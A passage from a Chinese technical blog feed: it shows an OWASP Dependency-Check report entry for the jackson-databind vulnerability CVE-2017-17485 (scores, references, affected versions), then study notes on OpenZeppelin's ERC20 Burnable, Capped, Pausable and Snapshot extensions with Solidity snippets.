<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">         <span class="string">&quot;source&quot;</span>: <span class="string">&quot;NVD&quot;</span>,</span><br><span class="line">         <span class="string">&quot;name&quot;</span>: <span class="string">&quot;CVE-2017-17485&quot;</span>, <span class="comment"># cve编号</span></span><br><span class="line">         <span class="string">&quot;severity&quot;</span>: <span class="string">&quot;CRITICAL&quot;</span>, <span class="comment"># 风险等级</span></span><br><span class="line">         <span class="string">&quot;cvssv2&quot;</span>: &#123;</span><br><span class="line">           <span class="string">&quot;score&quot;</span>: <span class="number">7.5</span>,  <span class="comment"># cvss v2的评分</span></span><br><span class="line">           <span class="string">&quot;accessVector&quot;</span>: <span class="string">&quot;NETWORK&quot;</span>,</span><br><span class="line">           <span class="string">&quot;accessComplexity&quot;</span>: <span class="string">&quot;LOW&quot;</span>,</span><br><span class="line">           <span class="string">&quot;authenticationr&quot;</span>: <span class="string">&quot;NONE&quot;</span>,</span><br><span class="line">           <span class="string">&quot;confidentialImpact&quot;</span>: <span class="string">&quot;PARTIAL&quot;</span>,</span><br><span class="line">           <span class="string">&quot;integrityImpact&quot;</span>: <span class="string">&quot;PARTIAL&quot;</span>,</span><br><span class="line">           <span class="string">&quot;availabilityImpact&quot;</span>: <span class="string">&quot;PARTIAL&quot;</span>,</span><br><span class="line">           <span class="string">&quot;severity&quot;</span>: <span class="string">&quot;HIGH&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="string">&quot;cvssv3&quot;</span>: &#123;</span><br><span class="line">           <span class="string">&quot;baseScore&quot;</span>: <span class="number">9.8</span>, <span class="comment"># cvss v3的评分</span></span><br><span class="line">           <span class="string">&quot;attackVector&quot;</span>: <span class="string">&quot;NETWORK&quot;</span>,</span><br><span class="line">           <span class="string">&quot;attackComplexity&quot;</span>: <span class="string">&quot;LOW&quot;</span>,</span><br><span class="line">           <span class="string">&quot;privilegesRequired&quot;</span>: <span class="string">&quot;NONE&quot;</span>,</span><br><span class="line">           <span class="string">&quot;userInteraction&quot;</span>: <span class="string">&quot;NONE&quot;</span>,</span><br><span class="line">           <span class="string">&quot;scope&quot;</span>: <span class="string">&quot;UNCHANGED&quot;</span>,</span><br><span class="line">           <span class="string">&quot;confidentialityImpact&quot;</span>: <span class="string">&quot;HIGH&quot;</span>,</span><br><span class="line">           <span class="string">&quot;integrityImpact&quot;</span>: <span class="string">&quot;HIGH&quot;</span>,</span><br><span class="line">           <span class="string">&quot;availabilityImpact&quot;</span>: <span class="string">&quot;HIGH&quot;</span>,</span><br><span class="line">           <span class="string">&quot;baseSeverity&quot;</span>: <span class="string">&quot;CRITICAL&quot;</span></span><br><span class="line">         &#125;,</span><br><span class="line">         <span class="string">&quot;cwes&quot;</span>: [</span><br><span class="line">           <span class="string">&quot;CWE-502&quot;</span></span><br><span class="line">         ],</span><br><span class="line">         <span class="string">&quot;description&quot;</span>: <span class="string">&quot;FasterXML jackson-databind through 2.8.10 and 2.9.x through 2.9.3 allows unauthenticated remote code execution because of an incomplete fix for the CVE-2017-7525 deserialization flaw. This is exploitable by sending maliciously crafted JSON input to the readValue method of the ObjectMapper, bypassing a blacklist that is ineffective if the Spring libraries are available in the classpath.&quot;</span>, <span class="comment"># 描述</span></span><br><span class="line">         <span class="string">&quot;notes&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">         <span class="string">&quot;references&quot;</span>: [ <span class="comment"># 参考链接</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:3149&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:3149&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;CONFIRM&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/support.hpe.com\/hpsc\/doc\/public\/display?docLocale=en_US&amp;docId=emr_na-hpesbhf03902en_us&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;https:\/\/support.hpe.com\/hpsc\/doc\/public\/display?docLocale=en_US&amp;docId=emr_na-hpesbhf03902en_us&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1449&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1449&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0342&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0342&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;MISC&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/github.com\/irsl\/jackson-rce-via-spel\/&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;https:\/\/github.com\/irsl\/jackson-rce-via-spel\/&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;CONFIRM&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/security.netapp.com\/advisory\/ntap-20180201-0003\/&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;https:\/\/security.netapp.com\/advisory\/ntap-20180201-0003\/&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:1782&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:1782&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:2858&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:2858&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0478&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0478&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0481&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0481&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;CONFIRM&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/github.com\/FasterXML\/jackson-databind\/issues\/1855&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;https:\/\/github.com\/FasterXML\/jackson-databind\/issues\/1855&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;BUGTRAQ&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http:\/\/www.securityfocus.com\/archive\/1\/541652\/100\/0\/threaded&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;20180109 CVE-2017-17485: one more way of rce in jackson-databind when defaultTyping+objects are used&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0480&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0480&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:2930&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:2930&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0116&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0116&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1447&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1447&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1450&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1450&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:3892&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:3892&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2019:1797&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2019:1797&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:0479&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:0479&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;DEBIAN&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/www.debian.org\/security\/2018\/dsa-4114&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;DSA-4114&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;OSSINDEX&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/ossindex.sonatype.org\/vuln\/b85a00e3-7d9b-49cf-9b19-b73f8ee60275&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;[CVE-2017-17485]  Improper Control of Generation of Code (\&quot;Code Injection\&quot;)&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1448&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1448&quot;</span></span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;source&quot;</span>: <span class="string">&quot;REDHAT&quot;</span>,</span><br><span class="line">             <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https:\/\/access.redhat.com\/errata\/RHSA-2018:1451&quot;</span>,</span><br><span class="line">             <span class="string">&quot;name&quot;</span>: <span class="string">&quot;RHSA-2018:1451&quot;</span></span><br><span class="line">           &#125;</span><br><span class="line">         ],</span><br><span class="line">         <span class="string">&quot;vulnerableSoftware&quot;</span>: [ <span class="comment"># 含cve的cpe表达式列表</span></span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:fasterxml:jackson-databind:*:*:*:*:*:*:*:*&quot;</span>,</span><br><span class="line">               <span class="string">&quot;vulnerabilityIdMatched&quot;</span>: <span class="string">&quot;true&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionStartExcluding&quot;</span>: <span class="string">&quot;2.9.0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionEndExcluding&quot;</span>: <span class="string">&quot;2.9.4&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_bpm_suite:6.4.11:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_enterprise_application_platform:6.0.0:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_enterprise_application_platform:6.4.0:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_brms:6.4.10:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_enterprise_application_platform:7.1.0:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:fasterxml:jackson-databind:*:*:*:*:*:*:*:*&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionStartIncluding&quot;</span>: <span class="string">&quot;2.8.0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionEndExcluding&quot;</span>: <span class="string">&quot;2.8.11&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:fasterxml:jackson:*:*:*:*:*:*:*:*&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionStartIncluding&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">               <span class="string">&quot;versionEndIncluding&quot;</span>: <span class="string">&quot;1.9&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_enterprise_application_platform:6.4.19:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;,</span><br><span class="line">           &#123;</span><br><span class="line">             <span class="string">&quot;software&quot;</span>: &#123;</span><br><span class="line">               <span class="string">&quot;id&quot;</span>: <span class="string">&quot;cpe:2.3:a:redhat:jboss_operations_network:3.3.10:*:*:*:*:*:*:*&quot;</span></span><br><span class="line">             &#125;</span><br><span class="line">           &#125;</span><br></pre></td></tr></table></figure>
<p>直观点的话,就是html格式里的内容</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200821143836.png" alt="20200821143836" /></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://owasp.org/www-project-dependency-check/">OWASP Dependency-Check官网</a></p>
</li>
<li class="lvl-2">
<p><a href="https://jeremylong.github.io/DependencyCheck/dependency-check-cli/arguments.html">DC_Command Line Arguments</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/f1a2f5357d12">使用OWASP Dependency-Check进行第三方依赖包安全扫描实践</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenZeppelin-ERC20-extensions源码学习(一)</title>
    <url>/2022/43604.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>对OpenZeppelin_ERC20_extensions文件夹里的自定义拓展合约，源码学习一波。</p>
<p><code>https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/README.adoc</code></p>
<h1>目录：</h1>
<table>
<thead>
<tr>
<th>Contract</th>
<th>使用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td>ERC20Burnable</td>
<td>对自己或有授权额度的地址进行代币销毁</td>
</tr>
<tr>
<td>ERC20Capped</td>
<td>在铸造代币时对总供应量设定一个不可变的上限值</td>
</tr>
<tr>
<td>ERC20Pausable</td>
<td>具有暂停代币传输的功能</td>
</tr>
<tr>
<td>ERC20Snapshot</td>
<td>有效存储过去的代币余额/供应量，以便以后随时查询</td>
</tr>
</tbody>
</table>
<h1>ERC20Burnable:</h1>
<h2 id="使用场景">使用场景</h2>
<p>对自己或有授权额度的地址进行代币销毁,使得代币总供应量↓，可能会让用户觉得自己持有的币会越来越有价值。。。</p>
<h2 id="源码解析：">源码解析：</h2>
<p>多了一个<code>burnFrom()</code>委托销毁的函数</p>
<h2 id="重要函数变量表：">重要函数变量表：</h2>
<table>
<thead>
<tr>
<th>Contract</th>
<th>Function/Variable</th>
<th>作用</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>ERC20Burnable</td>
<td>burn(uint256 amount)</td>
<td>token持有者销毁自己的token</td>
<td>调用<code>_burn</code>函数，余额↓，总供应量↓</td>
</tr>
<tr>
<td>ERC20Burnable</td>
<td>burnFrom(address account, uint256 amount)</td>
<td>token授权者销毁指定地址的token</td>
<td>caller授权额度↓，指定地址余额↓，总供应量↓</td>
</tr>
</tbody>
</table>
<h2 id="Inspire">Inspire:</h2>
<p>授权额度给别人或合约之后，第三者不只是可以拿来转账，也可以用来销毁，简言之就是具备了控制权</p>
<h1>ERC20Capped:</h1>
<h2 id="使用场景-2">使用场景</h2>
<p>在代币的构造函数里对总供应量设定一个<code>不可变的上限值</code>，可防止在代码实现中不小心改动了这个值，从而防止代币无限增发。</p>
<p>注意：是<code>上限值</code>不可变，<code>总供应量</code>还是可变的，只是<code>上限值</code>被写死了。</p>
<h2 id="源码解析：-2">源码解析：</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重要代码片段：</span></span><br><span class="line"></span><br><span class="line">uint256 private immutable _cap; <span class="comment">// 不可变常量 </span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 只在构造函数里，初次也只能有一次去定义该上限值</span></span><br><span class="line"><span class="title function_">constructor</span>(<span class="params">uint256 cap_</span>) &#123;</span><br><span class="line">    <span class="built_in">require</span>(cap_ &gt; <span class="number">0</span>, <span class="string">&quot;ERC20Capped: cap is 0&quot;</span>);</span><br><span class="line">    _cap = cap_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_mint</span>(<span class="params">address account, uint256 amount</span>) internal virtual override &#123;</span><br><span class="line"><span class="comment">// 限制铸造增发不能超过 上限值</span></span><br><span class="line">    <span class="built_in">require</span>(<span class="title class_">ERC20</span>.<span class="title function_">totalSupply</span>() + amount &lt;= <span class="title function_">cap</span>(), <span class="string">&quot;ERC20Capped: cap exceeded&quot;</span>);</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_mint</span>(account, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="重要函数变量表：-2">重要函数变量表：</h2>
<table>
<thead>
<tr>
<th>Contract</th>
<th>Function/Variable</th>
<th>作用</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>ERC20Capped</td>
<td>constructor(uint256 cap_)</td>
<td>只有在构造函数能够修改<code>代币供应量上限</code>的值</td>
<td>提前定义上限值为<code>immutable</code>的变量</td>
</tr>
<tr>
<td>ERC20Capped</td>
<td>cap()</td>
<td>返回上限值</td>
<td>——</td>
</tr>
<tr>
<td>ERC20Capped</td>
<td>_mint(address account, uint256 amount)</td>
<td>铸币增发</td>
<td>判断：代币供应量+增发量&lt;= 上限值</td>
</tr>
</tbody>
</table>
<h2 id="Inspire-2">Inspire:</h2>
<p>看来solidity里的各类修饰符 如<code>immutable</code>，还是大有学问的，在某些特定场景上使用起来能够起到合适的限制，后面要仔细总结一下</p>
<p>同理，对于某些通缩机制的代币，也可以设定一个下限值，在不断销毁代币时，也不能低于这个下限值</p>
<h1>ERC20Pausable：</h1>
<h2 id="使用场景-3">使用场景</h2>
<p>出bug的时候，可以由管理员设置<code>暂停开关</code>，阻止代币的传输、铸造和燃烧等功能，相当于一个紧急停止机制。</p>
<h2 id="源码解析：-3">源码解析：</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重要代码片段：</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 重写_beforeTokenTransfer,增加对 暂停开关值的判断</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_beforeTokenTransfer</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 amount</span></span><br><span class="line"><span class="params"></span>) internal virtual override &#123;</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_beforeTokenTransfer</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">require</span>(!<span class="title function_">paused</span>(), <span class="string">&quot;ERC20Pausable: token transfer while paused&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>ERC20Pausable.sol</code>继承<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/Pausable.sol">Pausable.sol</a>，<code>Pausable.sol</code>里围绕一个<code>_paused</code>暂停开关写了几个<code>event</code>和<code>modifier</code>,核心还是这个暂停开关变量。</p>
<p>如果自己的erc20合约想要实现暂停开关功能的话，继承<code>ERC20</code>, <code>Pausable</code>合约，重写<code>_beforeTokenTransfer</code>函数，在里面加上对暂停开关的判断条件就可以了。</p>
<p>其中<code>_beforeTokenTransfer</code>函数在<code>_transfer</code>函数里被调用到。</p>
<p><code>ERC20.sol</code>的<code>_transfer</code>函数里可以分成3个阶段:</p>
<ol>
<li class="lvl-3">
<p>token转移之前，<code>_beforeTokenTransfer()</code></p>
</li>
<li class="lvl-3">
<p>token转移时的具体处理逻辑（一般是<code>sender</code>余额↓，<code>recipient</code>余额↑）</p>
</li>
<li class="lvl-3">
<p>token转移之后，<code>_afterTokenTransfer</code></p>
</li>
</ol>
<p>控制了<code>_beforeTokenTransfer</code>函数后，就不会进入到token转移时的具体处理逻辑，也就控制了代币的转账、铸造、销毁这三类行为，从而实现了暂停功能。</p>
<h2 id="重要函数变量表：-3">重要函数变量表：</h2>
<table>
<thead>
<tr>
<th>Contract</th>
<th>Function</th>
<th>作用</th>
<th>操作</th>
</tr>
</thead>
<tbody>
<tr>
<td>Pausable</td>
<td>constructor()</td>
<td>——</td>
<td>暂停开关初始化 为关</td>
</tr>
<tr>
<td>ERC20Pausable</td>
<td>function _beforeTokenTransfer(address from,address to,uint256 amount)</td>
<td>阻止进入token转移的处理逻辑</td>
<td>加上对暂停开关变量的判断</td>
</tr>
</tbody>
</table>
<h1>ERC20Snapshot:</h1>
<p>使用快照机制扩展了 ERC20 代币。创建快照时，记录用户余额和当时的总供应量，以供以后访问。</p>
<blockquote>
<p>快照不是每个区块或每隔一段时间都会自动生成的，快照的周期依附于你设定的快照策略。</p>
<p>比如你可以设定每次<code>Transfer</code>执行一次快照等</p>
</blockquote>
<h2 id="使用场景：">使用场景：</h2>
<blockquote>
<ul class="lvl-1">
<li class="lvl-2">
<p>这可用于安全地创建基于代币余额的机制，例如无需信任的股息或加权投票。</p>
</li>
<li class="lvl-2">
<p>可以通过重用来自不同地方的相同余额来执行“双花”攻击帐户。通过使用快照来计算股息或投票权，这些攻击不再适用。</p>
</li>
<li class="lvl-2">
<p>它也可以用于创建高效的 ERC20 分叉机制</p>
</li>
</ul>
</blockquote>
<h2 id="源码解析：-4">源码解析：</h2>
<p>开始看之前有一些疑问：</p>
<ol>
<li class="lvl-3">
<p>用户余额该用什么数据结构来存储？</p>
</li>
<li class="lvl-3">
<p>什么时候、多少周期创建一个快照？</p>
</li>
</ol>
<h3 id="存储的数据结构：">存储的数据结构：</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>存储用户的余额:</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">struct <span class="title class_">Snapshots</span> &#123;</span><br><span class="line">    uint256[] ids; <span class="comment">// 存快照id</span></span><br><span class="line">    uint256[] values; <span class="comment">// 存余额/总供应量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> <span class="title class_">Snapshots</span>) private _accountBalanceSnapshots;</span><br></pre></td></tr></table></figure>
<p>存储用户余额的变量<code>_accountBalanceSnapshots</code>是一个二维的数据结构,类似于<code>python</code>里一个<code>dict</code>里存放两个<code>list</code>,两个<code>list</code>里的值索引是相对应的：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;addr&quot;</span>:地址做键值</span><br><span class="line">        ids数组:存快照id</span><br><span class="line">        <span class="attr">value</span>:存余额</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>存储总供应量:</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Snapshots</span> private _totalSupplySnapshots;</span><br></pre></td></tr></table></figure>
<p>存储代币总供应量的变量<code>_totalSupplySnapshots</code>是一个一维的数据结构,类似于<code>python</code>里就两个<code>list</code>,两个<code>list</code>里的值索引是相对应的：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ids数组:存快照id</span><br><span class="line"><span class="attr">value</span>:存余额</span><br></pre></td></tr></table></figure>
<h3 id="源码里的快照id策略：">源码里的快照id策略：</h3>
<p>还没跑过原本的代码，源码里的快照id策略应该是：定义了一个计数器变量，只能单增，具备单调性。</p>
